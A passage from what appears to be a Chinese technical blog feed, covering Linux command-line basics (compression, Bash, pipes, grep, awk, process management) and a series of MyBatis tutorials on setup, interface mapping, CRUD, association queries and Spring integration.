：搜索权限包含 mode 的文件-perm /mode ：搜索权限包含任一 mode 的文件 六、压缩与打包压缩文件名Linux 底下有很多压缩文件名，常见的如下： 扩展名 压缩程序 *.Z compress *.zip zip *.gz gzip *.bz2 bzip2 *.xz xz *.tar tar 程序打包的数据，没有经过压缩 *.tar.gz tar 程序打包的文件，经过 gzip 的压缩 *.tar.bz2 tar 程序打包的文件，经过 bzip2 的压缩 *.tar.xz tar 程序打包的文件，经过 xz 的压缩 压缩指令1. gzipgzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。 经过 gzip 压缩过，源文件就不存在了。 有 9 个不同的压缩等级可以使用。 可以使用 zcat、zmore、zless 来读取压缩文件的内容。 123456$ gzip [-cdtv#] filename-c ：将压缩的数据输出到屏幕上-d ：解压缩-t ：检验压缩文件是否出错-v ：显示压缩比等信息-# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6 2. bzip2提供比 gzip 更高的压缩比。 查看命令：bzcat、bzmore、bzless、bzgrep。 12$ bzip2 [-cdkzv#] filename-k ：保留源文件 3. xz提供比 bzip2 更佳的压缩比。 可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。 查看命令：xzcat、xzmore、xzless、xzgrep。 1$ xz [-dtlkc#] filename 打包压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gzip、bzip2、xz 将打包文件进行压缩。 123456789101112$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename... ==打包压缩$ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件] ==查看$ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录] ==解压缩-z ：使用 zip；-j ：使用 bzip2；-J ：使用 xz；-c ：新建打包文件；-t ：查看打包文件里面有哪些文件；-x ：解打包或解压缩的功能；-v ：在压缩/解压缩的过程中，显示正在处理的文件名；-f : filename：要处理的文件；-C 目录 ： 在特定目录解压缩。 使用方式 命令 打包压缩 tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称 查 看 tar -jtv -f filename.tar.bz2 解压缩 tar -jxv -f filename.tar.bz2 -C 要解压缩的目录 七、Bash可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。 特性 命令历史：记录使用过的命令 命令与文件补全：快捷键：tab 命名别名：例如 lm 是 ls -al 的别名 shell scripts 通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件 变量操作对一个变量赋值直接使用 =。 对变量取用需要在变量前加上 \$ ，也可以用 \${} 的形式； 输出变量使用 echo 命令。 123$ x=abc$ echo $x$ echo $&#123;x&#125; 变量内容如果有空格，必须使用双引号或者单引号。 双引号内的特殊字符可以保留原本特性，例如 x=”lang is \$LANG”，则 x 的值为 lang is zh_TW.UTF-8； 单引号内的特殊字符就是特殊字符本身，例如 x=’lang is \$LANG’，则 x 的值为 lang is \$LANG。 可以使用 `指令` 或者 \$(指令) 的方式将指令的执行结果赋值给变量。例如 version=\$(uname -r)，则 version 的值为 4.15.0-22-generic。 可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。 Bash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令： 12345$ declare [-aixr] variable-a ： 定义为数组类型-i ： 定义为整数类型-x ： 定义为环境变量-r ： 定义为 readonly 类型 使用 [ ] 来对数组进行索引操作： 123$ array[1]=a$ array[2]=b$ echo $&#123;array[1]&#125; 指令搜索顺序 以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ； 由别名找到该指令来执行； 由 Bash 内置的指令来执行； 按 \$PATH 变量指定的搜索路径的顺序找到第一个指令来执行。 数据流重定向重定向指的是使用文件代替标准输入、标准输出和标准错误输出。 1 代码 运算符 标准输入 (stdin) 0 &lt; 或 &lt;&lt; 标准输出 (stdout) 1 &gt; 或 &gt;&gt; 标准错误输出 (stderr) 2 2&gt; 或 2&gt;&gt; 其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。 可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。 如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2&gt;&amp;1 表示将标准错误输出转换为标准输出。 1$ find /home -name .bashrc &gt; list 2&gt;&amp;1 八、管道指令管道是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管道。 在命令之间使用 | 分隔各个管道命令。 1$ ls -al /etc | less 提取指令cut 对数据进行切分，取出想要的部分。 切分过程一行一行地进行。 1234$ cut-d ：分隔符-f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间-c ：以字符为单位取出区间 示例 1：last 显示登入者的信息，取出用户名。 123456$ lastroot pts/1 192.168.201.101 Sat Feb 7 12:35 still logged inroot pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)$ last | cut -d ' ' -f 1 示例 2：将 export 输出的信息，取出第 12 字符以后的所有字符串。 12345678$ exportdeclare -x HISTCONTROL="ignoredups"declare -x HISTSIZE="1000"declare -x HOME="/home/dmtsai"declare -x HOSTNAME="study.centos.vbird".....(其他省略).....$ export | cut -c 12- 排序指令sort 用于排序。 123456789$ sort [-fbMnrtuk] [file or stdin]-f ：忽略大小写-b ：忽略最前面的空格-M ：以月份的名字来排序，例如 JAN，DEC-n ：使用数字-r ：反向排序-u ：相当于 unique，重复的内容只出现一次-t ：分隔符，默认为 tab-k ：指定排序的区间 示例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。 12345$ cat /etc/passwd | sort -t ':' -k 3root:x:0:0:root:/root:/bin/bashdmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bashalex:x:1001:1002::/home/alex:/bin/basharod:x:1002:1003::/home/arod:/bin/bash uniq 可以将重复的数据只取一个。 123$ uniq [-ic]-i ：忽略大小写-c ：进行计数 示例：取得每个人的登录总次数 1234567$ last | cut -d ' ' -f 1 | sort | uniq -c16 (unknown47 dmtsai4 reboot7 root1 wtmp 双向输出重定向输出重定向会将输出内容重定向到文件中，而 tee 不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。 1$ tee [-a] file 字符转换指令tr 用来删除一行中的字符，或者对字符进行替换。 12$ tr [-ds] SET1 ...-d ： 删除行中 SET1 这个字符串 示例，将 last 输出的信息所有小写转换为大写。 1$ last | tr '[a-z]' '[A-Z]' col 将 tab 字符转为空格字符。 12$ col [-xb]-x ： 将 tab 键转换成对等的空格键 expand 将 tab 转换一定数量的空格，默认是 8 个。 12$ expand [-t] file-t ：tab 转为空格的数量 join 将有相同数据的那一行合并在一起。 12345$ join [-ti12] file1 file2-t ：分隔符，默认为空格-i ：忽略大小写的差异-1 ：第一个文件所用的比较字段-2 ：第二个文件所用的比较字段 paste 直接将两行粘贴在一起。 12$ paste [-d] file1 file2-d ：分隔符，默认为 tab 分区指令split 将一个文件划分成多个文件。 1234$ split [-bl] file PREFIX-b ：以大小来进行分区，可加单位，例如 b, k, m 等-l ：以行数来进行分区。- PREFIX ：分区文件的前导名称 九、正则表达式grepg/re/p（globally search a regular expression and print)，使用正则表示式进行全局查找并打印。 123456$ grep [-acinv] [--color=auto] 搜寻字符串 filename-c ： 统计个数-i ： 忽略大小写-n ： 输出行号-v ： 反向选择，也就是显示出没有 搜寻字符串 内容的那一行--color=auto ：找到的关键字加颜色显示 示例：把含有 the 字符串的行提取出来（注意默认会有 –color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串） 123456$ grep -n 'the' regular_express.txt8:I can't finish the test.12:the symbol '*' is represented as start.15:You are the best is mean you are the no. 1.16:The world Happy is the same with "glad".18:google is the best tools for search keyword 因为 { 和 } 在 shell 是有特殊意义的，因此必须要使用转义字符进行转义。 1$ grep -n 'go\&#123;2,5\&#125;g' regular_express.txt printf用于格式化输出。它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。 1234$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33 awk是由 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 创造，awk 这个名字就是这三个创始人名字的首字母。 awk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：\$n，n 为字段号，从 1 开始，\$0 表示一整行。 示例：取出最近五个登录用户的用户名和 IP 123456$ last -n 5dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged indmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15) 1$ last -n 5 | awk '&#123;print $1 "\t" $3&#125;' 可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。 1$ awk '条件类型 1 &#123;动作 1&#125; 条件类型 2 &#123;动作 2&#125; ...' filename 示例：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。 1234$ cat /etc/passwd | awk &apos;BEGIN &#123;FS=&quot;:&quot;&#125; $3 &lt; 10 &#123;print $1 &quot;\t &quot; $3&#125;&apos;root 0bin 1daemon 2 awk 变量： 变量名称 代表意义 NF 每一行拥有的字段总数 NR 目前所处理的是第几行数据 FS 目前的分隔字符，默认是空格键 示例：显示正在处理的行号以及每一行有多少字段 123456$ last -n 5 | awk '&#123;print $1 "\t lines: " NR "\t columns: " NF&#125;'dmtsai lines: 1 columns: 10dmtsai lines: 2 columns: 10dmtsai lines: 3 columns: 10dmtsai lines: 4 columns: 10dmtsai lines: 5 columns: 9 十、进程管理查看进程1. ps查看某个时间点的进程信息 示例一：查看自己的进程 1# ps -l 示例二：查看系统所有进程 1# ps aux 示例三：查看特定的进程 1# ps aux | grep threadx 2. pstree查看进程树 示例：查看所有进程树 1# pstree -A 3. top实时显示进程信息 示例：两秒钟刷新一次 1# top -d 2 4. netstat查看占用端口的进程 示例：查看特定端口的进程 1# netstat -anp | grep port 进程状态 状态 说明 R running or runnable (on run queue) D uninterruptible sleep (usually I/O) S interruptible sleep (waiting for an event to complete) Z zombie (terminated but not reaped by its parent) T stopped (either by a job control signal or because it is being traced) SIGCHLD当一个子进程改变了它的状态时（停止运行，继续运行或者退出），有两件事会发生在父进程中： 得到 SIGCHLD 信号； waitpid() 或者 wait() 调用会返回。 其中子进程发送的 SIGCHLD 信号包含了子进程的信息，比如进程 ID、进程状态、进程使用 CPU 的时间等。 在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息，父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。 wait()1pid_t wait(int *status) 父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。 如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时 errno 被置为 ECHILD。 参数 status 用来保存被收集的子进程退出时的一些状态，如果对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为 NULL。 waitpid()1pid_t waitpid(pid_t pid, int *status, int options) 作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。 pid 参数指示一个子进程的 ID，表示只关心这个子进程退出的 SIGCHLD 信号。如果 pid=-1 时，那么和 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。 options 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。 孤儿进程一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。 孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。 由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。 僵尸进程一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。 僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。 系统所能使用的进程号是有限的，如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。 要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时僵尸进程就会变成孤儿进程，从而被 init 进程所收养，这样 init 进程就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis与Spring集成]]></title>
    <url>%2F2018%2F03%2F13%2FMybatis%E4%B8%8ESpring%E9%9B%86%E6%88%90%2F</url>
    <content type="text"><![CDATA[Mybatis 与 Spring3 集成在这一系列文章中，前面讲到纯粹用 Mybatis 连接数据库，然后 进行增删改查，以及多表联合查询的的例子，但实际项目中，通常会用 Spring 这个沾合剂来管理 datasource 等。充分利用 Spring 基于接口的编程，以及aop ,ioc 带来的方便。用 Spring 来管理 Mybatis 与管理 Hibernate 有很多类似的地方。今天的重点就是数据源管理以及 bean 的配置。 你可以下载源码后，对比着看，源代码没有带 jar 包，太大了，空间有限. 有截图，你可以看到用到哪些jar包，源码在本文最后。 首先对前面的工程结构做一点改变，在 src_user 源代码目录下建立文件夹 config ,并将原来的 Mybatis 配置文件 Configuration.xml 移动到这个文件夹中, 并在 config 文家夹中建立 spring 配置文件：applicationContext.xml ，这个配置文件里最主要的配置： 12345678910111213141516171819202122&lt;!--本示例采用DBCP连接池，应预先把DBCP的jar包复制到工程的lib目录下。 --&gt; &lt;bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource"&gt; &lt;property name="driverClassName" value="com.mysql.jdbc.Driver"/&gt; &lt;property name="url" value="jdbc:mysql://127.0.0.1:3306/mybatis?characterEncoding=utf8"/&gt; &lt;property name="username" value="root"/&gt; &lt;property name="password" value="password"/&gt; &lt;/bean&gt; &lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;!--dataSource属性指定要用到的连接池--&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;!--configLocation属性指定mybatis的核心配置文件--&gt; &lt;property name="configLocation" value="config/Configuration.xml"/&gt; &lt;/bean&gt; &lt;bean id="userMapper" class="org.mybatis.spring.mapper.MapperFactoryBean"&gt; &lt;!--sqlSessionFactory属性指定要用到的SqlSessionFactory实例--&gt; &lt;property name="sqlSessionFactory" ref="sqlSessionFactory" /&gt; &lt;!--mapperInterface属性指定映射器接口，用于实现此接口并生成映射器对象--&gt; &lt;property name="mapperInterface" value="com.yihaomen.mybatis.inter.IUserOperation" /&gt; &lt;/bean&gt; 这里面的重点就是org.mybatis.spring.SqlSessionFactoryBean与 org.mybatis.spring.mapper.MapperFactoryBean[b]实现了 Spring 的接口，并产生对象。详细可以查看 mybatis-spring 代码。（http://code.google.com/p/mybatis/）,如果仅仅使用，固定模式，这样配置就好。 然后写测试程序 123456789101112131415161718192021222324252627282930313233343536373839package com.yihaomen.test;import java.util.List;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import com.yihaomen.mybatis.inter.IUserOperation;import com.yihaomen.mybatis.model.Article;import com.yihaomen.mybatis.model.User;public class MybatisSprintTest &#123; private static ApplicationContext ctx; static &#123; ctx = new ClassPathXmlApplicationContext("config/applicationContext.xml"); &#125; public static void main(String[] args) &#123; IUserOperation mapper = (IUserOperation)ctx.getBean("userMapper"); //测试id=1的用户查询，根据数据库中的情况，可以改成你自己的. System.out.println("得到用户id=1的用户信息"); User user = mapper.selectUserByID(1); System.out.println(user.getUserAddress()); //得到文章列表测试 System.out.println("得到用户id为1的所有文章列表"); List&lt;Article&gt; articles = mapper.getUserArticles(1); for(Article article:articles)&#123; System.out.println(article.getContent()+"--"+article.getTitle()); &#125; &#125; &#125; 运行即可得到相应的结果。 工程图： 用到的 jar 包，如下图：]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis关联数据查询]]></title>
    <url>%2F2018%2F03%2F05%2FMybatis%E5%85%B3%E8%81%94%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[实现关联数据的查询有了前面几章的基础，对一些简单的应用是可以处理的，但在实际项目中，经常是关联表的查询，比如最常见到的多对一，一对多等。这些查询是如何处理的呢，这一讲就讲这个问题。我们首先创建一个 Article 这个表，并初始化数据。 12345678910111213141516Drop TABLE IF EXISTS `article`;Create TABLE `article` ( `id` int(11) NOT NULL auto_increment, `userid` int(11) NOT NULL, `title` varchar(100) NOT NULL, `content` text NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;-- ------------------------------ 添加几条测试数据-- ----------------------------Insert INTO `article` VALUES ('1', '1', 'test_title', 'test_content');Insert INTO `article` VALUES ('2', '1', 'test_title_2', 'test_content_2');Insert INTO `article` VALUES ('3', '1', 'test_title_3', 'test_content_3');Insert INTO `article` VALUES ('4', '1', 'test_title_4', 'test_content_4'); 你应该发现了，这几个文章对应的 userid 都是 1，所以需要用户表 user 里面有 id=1 的数据。可以修改成满足自己条件的数据.按照 orm 的规则，表已经创建了，那么肯定需要一个对象与之对应，所以我们增加一个 Article 的 class。 123456789101112131415161718192021222324252627282930313233343536package com.yihaomen.mybatis.model;public class Article &#123; private int id; private User user; private String title; private String content; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public User getUser() &#123; return user; &#125; public void setUser(User user) &#123; this.user = user; &#125; public String getTitle() &#123; return title; &#125; public void setTitle(String title) &#123; this.title = title; &#125; public String getContent() &#123; return content; &#125; public void setContent(String content) &#123; this.content = content; &#125;&#125; 注意一下，文章的用户是怎么定义的，是直接定义的一个 User 对象。而不是 int 类型。 多对一的实现场景:在读取某个用户发表的所有文章。当然还是需要在 User.xml 里面配置 select 语句, 但重点是这个 select 的 resultMap 对应什么样的数据呢。这是重点，这里要引入 association 看定义如下: 1234567891011121314151617&lt;!-- User 联合文章进行查询 方法之一的配置 (多对一的方式) --&gt; &lt;resultMap id="resultUserArticleList" type="Article"&gt; &lt;id property="id" column="aid" /&gt; &lt;result property="title" column="title" /&gt; &lt;result property="content" column="content" /&gt; &lt;association property="user" javaType="User"&gt; &lt;id property="id" column="id" /&gt; &lt;result property="userName" column="userName" /&gt; &lt;result property="userAddress" column="userAddress" /&gt; &lt;/association&gt; &lt;/resultMap&gt;&lt;select id="getUserArticles" parameterType="int" resultMap="resultUserArticleList"&gt; select user.id,user.userName,user.userAddress,article.id aid,article.title,article.content from user,article where user.id=article.userid and user.id=#&#123;id&#125; &lt;/select&gt; 这样配置之后，就可以了，将 select 语句与 resultMap 对应的映射结合起来看，就明白了。用 association 来得到关联的用户，这是多对一的情况，因为所有的文章都是同一个用户的。 还有另外一种处理方式，可以复用我们前面已经定义好的 resultMap ,前面我们定义过一个 resultListUser ,看这第二种方法如何实现: 12345678910111213141516171819&lt;resultMap type="User" id="resultListUser"&gt; &lt;id column="id" property="id" /&gt; &lt;result column="userName" property="userName" /&gt; &lt;result column="userAge" property="userAge" /&gt; &lt;result column="userAddress" property="userAddress" /&gt; &lt;/resultMap&gt; &lt;!-- User 联合文章进行查询 方法之二的配置 (多对一的方式) --&gt; &lt;resultMap id="resultUserArticleList-2" type="Article"&gt; &lt;id property="id" column="aid" /&gt; &lt;result property="title" column="title" /&gt; &lt;result property="content" column="content" /&gt; &lt;association property="user" javaType="User" resultMap="resultListUser" /&gt; &lt;/resultMap&gt; &lt;select id="getUserArticles" parameterType="int" resultMap="resultUserArticleList"&gt; select user.id,user.userName,user.userAddress,article.id aid,article.title,article.content from user,article where user.id=article.userid and user.id=#&#123;id&#125; &lt;/select&gt; 将 association 中对应的映射独立抽取出来，可以达到复用的目的。 好了，现在在 Test 类中写测试代码: 1234567891011121314public void getUserArticles(int userid)&#123; SqlSession session = sqlSessionFactory.openSession(); try &#123; IUserOperation userOperation=session.getMapper(IUserOperation.class); List&lt;Article&gt; articles = userOperation.getUserArticles(userid); for(Article article:articles)&#123; System.out.println(article.getTitle()+":"+article.getContent()+ ":作者是:"+article.getUser().getUserName()+":地址:"+ article.getUser().getUserAddress()); &#125; &#125; finally &#123; session.close(); &#125; &#125; 注意，漏掉了一点，我们一定要在 IUserOperation 接口中，加入 select 对应的 id 名称相同的方法： 12&gt; public List&lt;Article&gt; getUserArticles(int id);&gt; 然后运行就可以测试。]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis增删改查]]></title>
    <url>%2F2018%2F03%2F03%2FMybatis%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[实现数据的增删改查前面已经讲到用接口的方式编程。这种方式，要注意的一个地方就是。在 User.xml 的配置文件中，mapper namespace=&quot;com.yihaomen.mybatis.inter.IUserOperation&quot; ，命名空间非常重要，不能有错，必须与我们定义的 package 和 接口一致。如果不一致就会出错,这一章主要在上一讲基于接口编程的基础上完成如下事情: 用 mybatis 查询数据，包括列表 用 mybatis 增加数据 用 mybatis 更新数据 用 mybatis 删除数据 查询数据，前面已经讲过简单的，主要看查询出列表的查询出列表，也就是返回 list, 在我们这个例子中也就是 List , 这种方式返回数据，需要在 User.xml 里面配置返回的类型 resultMap, 注意不是 resultType, 而这个 resultMap 所对应的应该是我们自己配置的 1234567&lt;!-- 为了返回list 类型而定义的returnMap --&gt; &lt;resultMap type="User" id="resultListUser"&gt; &lt;id column="id" property="id" /&gt; &lt;result column="userName" property="userName" /&gt; &lt;result column="userAge" property="userAge" /&gt; &lt;result column="userAddress" property="userAddress" /&gt; &lt;/resultMap&gt; 查询列表的语句在 User.xml 中 1234&lt;!-- 返回list 的select 语句，注意 resultMap 的值是指向前面定义好的 --&gt; &lt;select id="selectUsers" parameterType="string" resultMap="resultListUser"&gt; select * from user where userName like #&#123;userName&#125; &lt;/select&gt; 在 IUserOperation 接口中增加方法：public List selectUsers(String userName); 现在在 Test 类中做测试 12345678910111213public void getUserList(String userName)&#123; SqlSession session = sqlSessionFactory.openSession(); try &#123; IUserOperation userOperation=session.getMapper(IUserOperation.class); List&lt;User&gt; users = userOperation.selectUsers(userName); for(User user:users)&#123; System.out.println(user.getId()+":"+user.getUserName()+":"+user.getUserAddress()); &#125; &#125; finally &#123; session.close(); &#125; &#125; 现在在 main 方法中可以测试： 1234public static void main(String[] args) &#123; Test testUser=new Test(); testUser.getUserList("%"); &#125; 可以看到，结果成功查询出来。如果是查询单个数据的话，用第二讲用过的方法就可以了。 用 mybatis 增加数据在 IUserOperation 接口中增加方法：public void addUser(User user); 在 User.xml 中配置 1234567891011121314&lt;!--执行增加操作的SQL语句。id和parameterType 分别与IUserOperation接口中的addUser方法的名字和 参数类型一致。以#&#123;name&#125;的形式引用Student参数 的name属性，MyBatis将使用反射读取Student参数 的此属性。#&#123;name&#125;中name大小写敏感。引用其他 的gender等属性与此一致。seGeneratedKeys设置 为"true"表明要MyBatis获取由数据库自动生成的主 键；keyProperty="id"指定把获取到的主键值注入 到Student的id属性--&gt; &lt;insert id="addUser" parameterType="User" useGeneratedKeys="true" keyProperty="id"&gt; insert into user(userName,userAge,userAddress) values(#&#123;userName&#125;,#&#123;userAge&#125;,#&#123;userAddress&#125;) &lt;/insert&gt; 然后在 Test 中写测试方法: 123456789101112131415161718/** * 测试增加,增加后，必须提交事务，否则不会写入到数据库. */ public void addUser()&#123; User user=new User(); user.setUserAddress("人民广场"); user.setUserName("飞鸟"); user.setUserAge(80); SqlSession session = sqlSessionFactory.openSession(); try &#123; IUserOperation userOperation=session.getMapper(IUserOperation.class); userOperation.addUser(user); session.commit(); System.out.println("当前增加的用户 id为:"+user.getId()); &#125; finally &#123; session.close(); &#125; &#125; 用 mybatis 更新数据方法类似，先在 IUserOperation 中增加方法：public void addUser(User user); 然后配置 User.xml 123&lt;update id="updateUser" parameterType="User" &gt; update user set userName=#&#123;userName&#125;,userAge=#&#123;userAge&#125;,userAddress=#&#123;userAddress&#125; where id=#&#123;id&#125; &lt;/update&gt; Test 类总的测试方法如下： 1234567891011121314public void updateUser()&#123; //先得到用户,然后修改，提交。 SqlSession session = sqlSessionFactory.openSession(); try &#123; IUserOperation userOperation=session.getMapper(IUserOperation.class); User user = userOperation.selectUserByID(4); user.setUserAddress("原来是魔都的浦东创新园区"); userOperation.updateUser(user); session.commit(); &#125; finally &#123; session.close(); &#125; &#125; 用 mybatis 删除数据同理，IUserOperation 增加方法：public void deleteUser(int id); 配置 User.xml 123&lt;delete id="deleteUser" parameterType="int"&gt; delete from user where id=#&#123;id&#125; &lt;/delete&gt; 然后在 Test 类中写测试方法: 1234567891011121314/** * 删除数据，删除一定要 commit. * @param id */ public void deleteUser(int id)&#123; SqlSession session = sqlSessionFactory.openSession(); try &#123; IUserOperation userOperation=session.getMapper(IUserOperation.class); userOperation.deleteUser(id); session.commit(); &#125; finally &#123; session.close(); &#125; &#125; 这样，所有增删改查都完成了，注意在增加，更改，删除的时候要调用 session.commit()，这样才会真正对数据库进行操作，否则是没有提交的。]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
        <tag>增删改查</tag>
        <tag>CRUD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis以接口方式编程]]></title>
    <url>%2F2018%2F03%2F03%2FMybatis%E4%BB%A5%E6%8E%A5%E5%8F%A3%E6%96%B9%E5%BC%8F%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[以接口的方式编程前面一章，已经搭建好了 Eclipse,Mybatis,MySql 的环境，并且实现了一个简单的查询。请注意，这种方式是用 SqlSession 实例来直接执行已映射的SQL语句： session.selectOne(&quot;com.yihaomen.mybatis.models.UserMapper.selectUserByID&quot;, 1) 其实还有更简单的方法，而且是更好的方法，使用合理描述参数和SQL语句返回值的接口（比如 IUserOperation.class），这样现在就可以至此那个更简单，更安全的代码，没有容易发生的字符串文字和转换的错误.下面是详细过程: 在 src_user 源码目录下建立com.yihaomen.mybatis.inter这个包，并建立接口类IUserOperation , 内容如下： 1234567package com.yihaomen.mybatis.inter;import com.yihaomen.mybatis.model.User;public interface IUserOperation &#123; public User selectUserByID(int id);&#125; 请注意，这里面有一个方法名 selectUserByID 必须与 User.xml 里面配置的 select 的id 对应（&lt;select id=”selectUserByID”） 重写测试代码 1234567891011public static void main(String[] args) &#123; SqlSession session = sqlSessionFactory.openSession(); try &#123; IUserOperation userOperation=session.getMapper(IUserOperation.class); User user = userOperation.selectUserByID(1); System.out.println(user.getUserAddress()); System.out.println(user.getUserName()); &#125; finally &#123; session.close(); &#125; &#125; 整个工程结构图现在如下： 运行这个测试程序，就可以看到结果了。]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>ORM框架</tag>
        <tag>接口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis开发环境搭建]]></title>
    <url>%2F2018%2F03%2F01%2FMybatis%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[开发环境搭建Mybatis 的开发环境搭建，选择: Eclipse J2EE 版本，MySql 5.1 ,JDK 1.7,Mybatis3.2.0.jar包。这些软件工具均可以到各自的官方网站上下载。 首先建立一个名字为 MyBaits 的 dynamic web project 现阶段，你可以直接建立 java 工程，但一般都是开发 Web 项目，这个系列教程最后也是 Web 的，所以一开始就建立 Web 工程。 将 Mybatis-3.2.0-SNAPSHOT.jar，mysql-connector-java-5.1.22-bin.jar 拷贝到 Web 工程的 lib 目录。 创建 mysql 测试数据库和用户表,注意，这里采用的是 utf-8 编码。 创建用户表,并插入一条测试数据 123456789Create TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `userName` varchar(50) DEFAULT NULL, `userAge` int(11) DEFAULT NULL, `userAddress` varchar(200) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;Insert INTO `user` VALUES ('1', 'summer', '100', 'shanghai,pudong'); 到此为止，前期准备工作就完成了。下面开始真正配置 Mybatis 项目了。 在 MyBatis 里面创建两个源码目录，分别为 src_user,test_src, 用如下方式建立,鼠标右键点击 JavaResource。 设置 Mybatis 配置文件:Configuration.xml, 在 src_user 目录下建立此文件，内容如下: 123456789101112131415161718192021222324&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN""http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;typeAliases&gt; &lt;typeAlias alias="User" type="com.yihaomen.mybatis.model.User"/&gt; &lt;/typeAliases&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;transactionManager type="JDBC"/&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="driver" value="com.mysql.jdbc.Driver"/&gt; &lt;property name="url" 